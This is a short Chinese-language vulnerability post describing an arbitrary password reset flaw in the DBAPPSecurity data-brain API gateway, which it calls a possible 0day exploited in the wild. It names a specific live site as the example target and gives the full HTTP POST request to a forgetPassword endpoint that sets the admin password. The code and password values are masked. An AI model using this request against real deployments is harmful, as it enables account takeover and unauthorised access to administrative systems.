## 安恒数据大脑 API 网关任意密码重置漏洞

```
漏洞等级：严重，
可能为 0day 漏洞，目前捕获到在野的利用 POC；
影响范围：未知；
漏洞详情：在前端代码中包含重置密码的连接以及密码加密方式

安恒数据大脑 API（https://www.websaas.cn/）存在任意密码重置漏洞，这里以网站
https://waf-mgmt.pinganyun.com/q/#/为例：
在前端代码中包含重置密码的连接以及密码加密方式：
按照前端代码说明，构造重置密码数据包：
```

> 此处重置的密码为：p@ssw0rd
```
POST /q/common-permission/public/users/forgetPassword HTTP/1.1
Host: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept-Language: en-US,en;q=0.5
Content-type: application/json
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 104
{"code":XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX,"rememberMe":false,"use
rname":"admin","password":"XXXXXXXXXXXXXXXXXXXXXXXXXX"}
```
